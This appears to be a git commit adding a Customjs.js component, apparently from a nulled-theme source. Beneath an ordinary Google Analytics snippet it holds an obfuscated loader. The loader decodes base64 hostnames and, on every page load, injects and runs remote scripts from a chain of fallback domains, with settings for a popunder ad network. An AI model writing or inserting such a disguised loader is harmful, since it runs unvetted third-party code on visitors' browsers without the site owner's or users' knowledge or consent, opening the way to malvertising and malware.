b0020a135aa0efae94a4358ed556ed812560b727
Natalia Dyer <nataliadyer@premiumnulledthemes.com>
2024-06-18 08:50:30 +0530

    Customjs.js

---
+++ src/components/Customjs.js
@@ -0,0 +1,8 @@
+window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-RBCGSFJ4CF');
+
+/*<![CDATA[/* */
+(function(){var i=window,y="ceb02758694fd6a7f4e1474c2f701748",p=[["siteId",944-284-85*463-934+5140318],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],v=["d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL29uYWpheC5taW4uY3Nz","ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQvWEpVL3lpc01vYmlsZS5taW4uanM=","d3d3Lm96cG1pcmdseHZ0ZS5jb20vZG5hamF4Lm1pbi5jc3M=","d3d3LnR1YmF2bmV1bXlmLmNvbS9ZL2hpc01vYmlsZS5taW4uanM="],s=-1,b,f,e=function(){clearTimeout(f);s++;if(v[s]&&!(1742102639000<(new Date).getTime()&&1<s)){b=i.document.createElement("script");b.type="text/javascript";b.async=!0;var m=i.document.getElementsByTagName("script")[0];b.src="https://"+atob(v[s]);b.crossOrigin="anonymous";b.onerror=e;b.onload=function(){clearTimeout(f);i[y.slice(0,16)+y.slice(0,16)]||e()};f=setTimeout(e,5E3);m.parentNode.insertBefore(b,m)}};if(!i[y]){try{Object.freeze(i[y]=p)}catch(e){}e()}})();
+/*]]>/* */
